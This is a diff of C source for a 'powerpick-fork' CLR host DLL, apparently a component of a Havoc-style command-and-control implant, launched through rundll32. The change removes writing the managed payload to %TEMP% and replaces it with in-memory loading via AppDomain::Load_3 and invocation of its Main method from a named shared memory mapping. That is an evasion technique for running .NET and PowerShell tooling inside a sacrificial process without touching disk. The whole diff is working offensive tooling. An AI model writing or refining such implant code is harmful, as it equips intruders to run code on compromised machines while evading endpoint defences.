@@ -2,10 +2,11 @@
  * Sacrificial-process CLR host DLL for powerpick-fork.
  *
  * Launch: rundll32.exe "<dll>",PowerPickForkRun <mapName>
- * Map: magic | slot[160] | asmLen | asm | argsLen | args ("exec <b64>")
+ * Map: magic | slot[160] | asmLen | asm | argsLen | args | imports...
  *
- * Uses ICLRRuntimeHost::ExecuteInDefaultAppDomain after staging the managed
- * EXE to %TEMP% — avoids MinGW Invoke_3/VARIANT ABI crashes.
+ * Loads the managed PE from the mapping via AppDomain::Load_3 (no temp EXE),
+ * then invokes EntryPoint (Main) with the map name — Havoc PowerPick style.
+ * Host DLL is still staged for rundll32.
  */
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -18,42 +19,6 @@
 #define PPF_SLOT_MAX 160
 
 typedef HRESULT (WINAPI *FN_CLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);
-
-/* ICLRRuntimeHost — subset used for ExecuteInDefaultAppDomain */
-static GUID xCLSID_CLRRuntimeHost = {
-    0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}
-};
-static GUID xIID_ICLRRuntimeHost = {
-    0x90F1A06C, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}
-};
-
-typedef struct ICLRRuntimeHost ICLRRuntimeHost;
-
-typedef struct ICLRRuntimeHostVtbl {
-    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICLRRuntimeHost*, REFIID, void**);
-    ULONG(STDMETHODCALLTYPE* AddRef)(ICLRRuntimeHost*);
-    ULONG(STDMETHODCALLTYPE* Release)(ICLRRuntimeHost*);
-    HRESULT(STDMETHODCALLTYPE* Start)(ICLRRuntimeHost*);
-    HRESULT(STDMETHODCALLTYPE* Stop)(ICLRRuntimeHost*);
-    HRESULT(STDMETHODCALLTYPE* SetHostControl)(ICLRRuntimeHost*, void*);
-    HRESULT(STDMETHODCALLTYPE* GetCLRControl)(ICLRRuntimeHost*, void**);
-    HRESULT(STDMETHODCALLTYPE* UnloadAppDomain)(ICLRRuntimeHost*, DWORD, BOOL);
-    HRESULT(STDMETHODCALLTYPE* ExecuteInAppDomain)(ICLRRuntimeHost*, DWORD, void*, void*);
-    HRESULT(STDMETHODCALLTYPE* GetCurrentAppDomainId)(ICLRRuntimeHost*, DWORD*);
-    HRESULT(STDMETHODCALLTYPE* ExecuteApplication)(
-        ICLRRuntimeHost*, LPCWSTR, int, LPCWSTR const*, DWORD*);
-    HRESULT(STDMETHODCALLTYPE* ExecuteInDefaultAppDomain)(
-        ICLRRuntimeHost* This,
-        LPCWSTR pwzAssemblyPath,
-        LPCWSTR pwzTypeName,
-        LPCWSTR pwzMethodName,
-        LPCWSTR pwzArgument,
-        DWORD* pReturnValue);
-} ICLRRuntimeHostVtbl;
-
-struct ICLRRuntimeHost {
-    ICLRRuntimeHostVtbl* lpVtbl;
-};
 
 static void* PpAlloc(SIZE_T n)
 {
@@ -98,6 +63,31 @@ static void SlotWrite(HANDLE hSlot, const char* msg)
     FlushFileBuffers(hSlot);
 }
 
+static void SlotWriteHr(HANDLE hSlot, const char* prefix, HRESULT hr)
+{
+    char buf[96];
+    DWORD n = 0;
+    unsigned long u = (unsigned long)hr;
+    const char* hex = "0123456789ABCDEF";
+    int i;
+
+    if (!prefix) {
+        return;
+    }
+    while (prefix[n] && n < 64) {
+        buf[n] = prefix[n];
+        n++;
+    }
+    buf[n++] = '0';
+    buf[n++] = 'x';
+    for (i = 7; i >= 0; i--) {
+        buf[n++] = hex[(u >> (i * 4)) & 0xF];
+    }
+    buf[n++] = '\n';
+    buf[n] = '\0';
+    SlotWrite(hSlot, buf);
+}
+
 static BOOL PpAsciiToWide(const char* ascii, wchar_t* out, int outChars)
 {
     if (!ascii || !out || outChars <= 0) {
@@ -106,69 +96,231 @@ static BOOL PpAsciiToWide(const char* ascii, wchar_t* out, int outChars)
     return MultiByteToWideChar(CP_ACP, 0, ascii, -1, out, outChars) > 0;
 }
 
-static BOOL PpWriteTempExe(const BYTE* pe, DWORD peLen, char* outPath, SIZE_T outPathLen)
+static BOOL PpStartClr(
+    FN_CLRCreateInstance pCLRCreateInstance,
+    ICLRMetaHost** ppMeta,
+    ICLRRuntimeInfo** ppInfo,
+    ICorRuntimeHost** ppHost)
 {
-    char tempDir[MAX_PATH];
-    char name[16];
-    DWORD n;
-    HANDLE hFile;
-    DWORD written = 0;
-    BOOL ok;
-    DWORD tick;
-    int i;
+    BOOL loadable = FALSE;
+    HRESULT hr;
 
-    n = GetTempPathA((DWORD)sizeof(tempDir), tempDir);
-    if (n == 0 || n >= sizeof(tempDir)) {
+    hr = pCLRCreateInstance(
+        &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (void**)ppMeta);
+    if (hr != S_OK) {
         return FALSE;
     }
 
-    tick = GetTickCount();
-    name[0] = 'p';
-    name[1] = 'p';
-    name[2] = 'f';
-    for (i = 0; i < 8; i++) {
-        const char* hex = "0123456789ABCDEF";
-        name[3 + i] = hex[(tick >> (28 - 4 * i)) & 0xF];
-    }
-    name[11] = '\0';
-
-    if (outPathLen < PpLen(tempDir) + 16) {
-        return FALSE;
-    }
-    {
-        SIZE_T k;
-        for (k = 0; tempDir[k]; k++) {
-            outPath[k] = tempDir[k];
-        }
-        for (i = 0; name[i]; i++) {
-            outPath[k++] = name[i];
-        }
-        outPath[k++] = '.';
-        outPath[k++] = 'e';
-        outPath[k++] = 'x';
-        outPath[k++] = 'e';
-        outPath[k] = '\0';
-    }
-
-    hFile = CreateFileA(
-        outPath,
-        GENERIC_WRITE,
-        0,
-        NULL,
-        CREATE_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
+    hr = (*ppMeta)->lpVtbl->GetRuntime(
+        *ppMeta, L"v4.0.30319", &xIID_ICLRRuntimeInfo, (void**)ppInfo);
+    if (hr != S_OK) {
         return FALSE;
     }
 
-    ok = WriteFile(hFile, pe, peLen, &written, NULL);
-    CloseHandle(hFile);
-    if (!ok || written != peLen) {
-        DeleteFileA(outPath);
+    hr = (*ppInfo)->lpVtbl->IsLoadable(*ppInfo, &loadable);
+    if (hr != S_OK || !loadable) {
         return FALSE;
     }
-    return TRUE;
+
+    hr = (*ppInfo)->lpVtbl->GetInterface(
+        *ppInfo,
+        &xCLSID_CorRuntimeHost,
+        &xIID_ICorRuntimeHost,
+        (void**)ppHost);
+    if (hr != S_OK) {
+        return FALSE;
+    }
+
+    hr = (*ppHost)->lpVtbl->Start(*ppHost);
+    return hr == S_OK;
+}
+
+/*
+ * Havoc-style: Load_3(asm bytes) → EntryPoint → Invoke_3(Main, string[]{ mapName }).
+ */
+static int PpInvokeManagedFromMemory(
+    HANDLE hSlotWrite,
+    const BYTE* asmBytes,
+    DWORD asmLen,
+    const wchar_t* mapNameW)
+{
+    ICLRMetaHost* pClrMetaHost = NULL;
+    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
+    ICorRuntimeHost* pCorHost = NULL;
+    IUnknown* pAppDomainThunk = NULL;
+    AppDomain* pAppDomain = NULL;
+    Assembly* pAssembly = NULL;
+    MethodInfo* pMethodInfo = NULL;
+    SAFEARRAY* pSafeArray = NULL;
+    SAFEARRAY* psaStaticMethodArgs = NULL;
+    SAFEARRAYBOUND rgsabound[1];
+    VARIANT vtPsa;
+    VARIANT obj;
+    VARIANT retVal;
+    LPVOID pvData = NULL;
+    FN_CLRCreateInstance pCLRCreateInstance;
+    HMODULE mscoree;
+    HRESULT hr;
+    int exitCode = 1;
+    LONG idx = 0;
+    BSTR bMap = NULL;
+
+    VariantInit(&vtPsa);
+    VariantInit(&obj);
+    VariantInit(&retVal);
+    obj.vt = VT_NULL;
+
+    mscoree = LoadLibraryA("mscoree.dll");
+    if (!mscoree) {
+        SlotWrite(hSlotWrite, "[!] host: mscoree.dll missing\n");
+        return 1;
+    }
+    pCLRCreateInstance =
+        (FN_CLRCreateInstance)GetProcAddress(mscoree, "CLRCreateInstance");
+    if (!pCLRCreateInstance) {
+        SlotWrite(hSlotWrite, "[!] host: CLRCreateInstance missing\n");
+        return 1;
+    }
+
+    if (!PpStartClr(
+            pCLRCreateInstance, &pClrMetaHost, &pClrRuntimeInfo, &pCorHost)) {
+        SlotWrite(hSlotWrite, "[!] host: CLR start failed\n");
+        goto done;
+    }
+
+    hr = pCorHost->lpVtbl->CreateDomain(
+        pCorHost, L"PowerPickFork", NULL, &pAppDomainThunk);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: CreateDomain failed hr=", hr);
+        goto done;
+    }
+
+    hr = pAppDomainThunk->lpVtbl->QueryInterface(
+        pAppDomainThunk, &xIID_AppDomain, (void**)&pAppDomain);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: AppDomain QI failed hr=", hr);
+        goto done;
+    }
+
+    rgsabound[0].cElements = asmLen;
+    rgsabound[0].lLbound = 0;
+    pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
+    if (!pSafeArray) {
+        SlotWrite(hSlotWrite, "[!] host: SafeArrayCreate failed\n");
+        goto done;
+    }
+
+    hr = SafeArrayAccessData(pSafeArray, &pvData);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayAccessData failed hr=", hr);
+        goto done;
+    }
+    PpCopy(pvData, asmBytes, asmLen);
+    SafeArrayUnaccessData(pSafeArray);
+    pvData = NULL;
+
+    hr = pAppDomain->lpVtbl->Load_3(pAppDomain, pSafeArray, &pAssembly);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: Load_3 failed hr=", hr);
+        goto done;
+    }
+
+    hr = pAssembly->lpVtbl->EntryPoint(pAssembly, &pMethodInfo);
+    if (hr != S_OK || !pMethodInfo) {
+        SlotWriteHr(hSlotWrite, "[!] host: EntryPoint failed hr=", hr);
+        goto done;
+    }
+
+    /* Main(string[] args) — one element: map name (Havoc PowerPick pattern). */
+    psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+    if (!psaStaticMethodArgs) {
+        SlotWrite(hSlotWrite, "[!] host: args SafeArrayCreateVector failed\n");
+        goto done;
+    }
+
+    vtPsa.vt = (VARTYPE)(VT_ARRAY | VT_BSTR);
+    vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
+    if (!vtPsa.parray) {
+        SlotWrite(hSlotWrite, "[!] host: BSTR SafeArrayCreateVector failed\n");
+        goto done;
+    }
+
+    bMap = SysAllocString(mapNameW);
+    if (!bMap) {
+        SlotWrite(hSlotWrite, "[!] host: SysAllocString failed\n");
+        goto done;
+    }
+    idx = 0;
+    hr = SafeArrayPutElement(vtPsa.parray, &idx, bMap);
+    SysFreeString(bMap);
+    bMap = NULL;
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayPutElement(BSTR) hr=", hr);
+        goto done;
+    }
+
+    idx = 0;
+    hr = SafeArrayPutElement(psaStaticMethodArgs, &idx, &vtPsa);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: SafeArrayPutElement(args) hr=", hr);
+        goto done;
+    }
+
+    hr = pMethodInfo->lpVtbl->Invoke_3(
+        pMethodInfo, obj, psaStaticMethodArgs, &retVal);
+    if (hr != S_OK) {
+        SlotWriteHr(hSlotWrite, "[!] host: Invoke_3 failed hr=", hr);
+        exitCode = 1;
+        goto done;
+    }
+
+    if (retVal.vt == VT_I4) {
+        exitCode = retVal.lVal;
+    } else if (retVal.vt == VT_INT) {
+        exitCode = retVal.intVal;
+    } else {
+        exitCode = 0;
+    }
+
+done:
+    VariantClear(&retVal);
+    VariantClear(&obj);
+    if (vtPsa.parray) {
+        SafeArrayDestroy(vtPsa.parray);
+        vtPsa.parray = NULL;
+    }
+    VariantClear(&vtPsa);
+    if (psaStaticMethodArgs) {
+        SafeArrayDestroy(psaStaticMethodArgs);
+    }
+    if (pSafeArray) {
+        SafeArrayDestroy(pSafeArray);
+    }
+    if (pMethodInfo) {
+        pMethodInfo->lpVtbl->Release(pMethodInfo);
+    }
+    if (pAssembly) {
+        pAssembly->lpVtbl->Release(pAssembly);
+    }
+    if (pAppDomain) {
+        pAppDomain->lpVtbl->Release(pAppDomain);
+    }
+    if (pCorHost && pAppDomainThunk) {
+        pCorHost->lpVtbl->UnloadDomain(pCorHost, pAppDomainThunk);
+    }
+    if (pAppDomainThunk) {
+        pAppDomainThunk->lpVtbl->Release(pAppDomainThunk);
+    }
+    if (pCorHost) {
+        pCorHost->lpVtbl->Release(pCorHost);
+    }
+    if (pClrRuntimeInfo) {
+        pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
+    }
+    if (pClrMetaHost) {
+        pClrMetaHost->lpVtbl->Release(pClrMetaHost);
+    }
+    return exitCode;
 }
 
 static int RunHost(const char* mapName)
@@ -180,27 +332,12 @@ static int RunHost(const char* mapName)
     char slotPath[PPF_SLOT_MAX];
     DWORD asmLen;
     BYTE* asmBytes;
-    DWORD argsLen;
-    char* argsAscii;
-    char* argsCopy = NULL;
     HANDLE hSlotWrite = INVALID_HANDLE_VALUE;
     HANDLE stdOut = INVALID_HANDLE_VALUE;
     HANDLE stdErr = INVALID_HANDLE_VALUE;
     BOOL comInit = FALSE;
-    char exePathA[MAX_PATH];
-    wchar_t exePathW[MAX_PATH];
-    wchar_t argW[4096];
-    ICLRMetaHost* pClrMetaHost = NULL;
-    ICLRRuntimeInfo* pClrRuntimeInfo = NULL;
-    ICLRRuntimeHost* pRuntimeHost = NULL;
-    FN_CLRCreateInstance pCLRCreateInstance;
-    HMODULE mscoree;
-    HRESULT hr;
-    DWORD managedRet = 0;
+    wchar_t mapNameW[4096];
     int exitCode = 1;
-    BOOL wroteExe = FALSE;
-
-    exePathA[0] = '\0';
 
     if (mapName == NULL || mapName[0] == '\0') {
         return 2;
@@ -244,34 +381,6 @@ static int RunHost(const char* mapName)
     }
 
     asmBytes = p + 4 + PPF_SLOT_MAX + 4;
-    argsLen = *(DWORD*)(asmBytes + asmLen);
-    argsAscii = (char*)(asmBytes + asmLen + 4);
-    if (argsLen == 0 || argsLen > 4 * 1024 * 1024) {
-        UnmapViewOfFile(view);
-        CloseHandle(hMap);
-        return 8;
-    }
-
-    argsCopy = (char*)PpAlloc((SIZE_T)argsLen + 1);
-    if (!argsCopy) {
-        UnmapViewOfFile(view);
-        CloseHandle(hMap);
-        return 9;
-    }
-    PpCopy(argsCopy, argsAscii, argsLen);
-    argsCopy[argsLen] = '\0';
-
-    if (!PpWriteTempExe(asmBytes, asmLen, exePathA, sizeof(exePathA))) {
-        PpFree(argsCopy);
-        UnmapViewOfFile(view);
-        CloseHandle(hMap);
-        return 11;
-    }
-    wroteExe = TRUE;
-
-    /* Keep map open for managed ForkExec; only need slot path from it. */
-    PpFree(argsCopy);
-    argsCopy = NULL;
 
     hSlotWrite = CreateFileA(
         slotPath,
@@ -282,7 +391,6 @@ static int RunHost(const char* mapName)
         FILE_ATTRIBUTE_NORMAL,
         NULL);
     if (hSlotWrite == INVALID_HANDLE_VALUE) {
-        DeleteFileA(exePathA);
         UnmapViewOfFile(view);
         CloseHandle(hMap);
         return 10;
@@ -306,9 +414,8 @@ static int RunHost(const char* mapName)
         stdErr = hErr;
     }
 
-    if (!PpAsciiToWide(exePathA, exePathW, MAX_PATH) ||
-        !PpAsciiToWide(mapName, argW, 4096)) {
-        SlotWrite(hSlotWrite, "[!] host: path/map conversion failed\n");
+    if (!PpAsciiToWide(mapName, mapNameW, 4096)) {
+        SlotWrite(hSlotWrite, "[!] host: map name conversion failed\n");
         goto done;
     }
 
@@ -322,72 +429,11 @@ static int RunHost(const char* mapName)
         }
     }
 
-    mscoree = LoadLibraryA("mscoree.dll");
-    if (!mscoree) {
-        SlotWrite(hSlotWrite, "[!] host: mscoree.dll missing\n");
-        goto done;
-    }
-    pCLRCreateInstance =
-        (FN_CLRCreateInstance)GetProcAddress(mscoree, "CLRCreateInstance");
-    if (!pCLRCreateInstance) {
-        SlotWrite(hSlotWrite, "[!] host: CLRCreateInstance missing\n");
-        goto done;
-    }
-
-    hr = pCLRCreateInstance(&xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (void**)&pClrMetaHost);
-    if (hr != S_OK) {
-        SlotWrite(hSlotWrite, "[!] host: CLRMetaHost failed\n");
-        goto done;
-    }
-
-    hr = pClrMetaHost->lpVtbl->GetRuntime(
-        pClrMetaHost, L"v4.0.30319", &xIID_ICLRRuntimeInfo, (void**)&pClrRuntimeInfo);
-    if (hr != S_OK) {
-        SlotWrite(hSlotWrite, "[!] host: GetRuntime failed\n");
-        goto done;
-    }
-
-    hr = pClrRuntimeInfo->lpVtbl->GetInterface(
-        pClrRuntimeInfo,
-        &xCLSID_CLRRuntimeHost,
-        &xIID_ICLRRuntimeHost,
-        (void**)&pRuntimeHost);
-    if (hr != S_OK) {
-        SlotWrite(hSlotWrite, "[!] host: ICLRRuntimeHost QI failed\n");
-        goto done;
-    }
-
-    hr = pRuntimeHost->lpVtbl->Start(pRuntimeHost);
-    if (hr != S_OK) {
-        SlotWrite(hSlotWrite, "[!] host: ICLRRuntimeHost Start failed\n");
-        goto done;
-    }
-
-    hr = pRuntimeHost->lpVtbl->ExecuteInDefaultAppDomain(
-        pRuntimeHost,
-        exePathW,
-        L"PowerPickFork.Program",
-        L"ForkExec",
-        argW,
-        &managedRet);
-    if (hr != S_OK) {
-        SlotWrite(hSlotWrite, "[!] host: ExecuteInDefaultAppDomain failed\n");
-        exitCode = 1;
-    } else {
-        exitCode = (int)managedRet;
-    }
+    /* Keep mapping open: managed Main → RunFromMap re-opens by name. */
+    exitCode = PpInvokeManagedFromMemory(
+        hSlotWrite, asmBytes, asmLen, mapNameW);
 
 done:
-    PpFree(argsCopy);
-    if (pRuntimeHost) {
-        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
-    }
-    if (pClrRuntimeInfo) {
-        pClrRuntimeInfo->lpVtbl->Release(pClrRuntimeInfo);
-    }
-    if (pClrMetaHost) {
-        pClrMetaHost->lpVtbl->Release(pClrMetaHost);
-    }
     if (stdOut != INVALID_HANDLE_VALUE && stdOut != hSlotWrite) {
         CloseHandle(stdOut);
     }
@@ -403,9 +449,6 @@ done:
     }
     if (hMap) {
         CloseHandle(hMap);
-    }
-    if (wroteExe && exePathA[0]) {
-        DeleteFileA(exePathA);
     }
     if (comInit) {
         CoUninitialize();
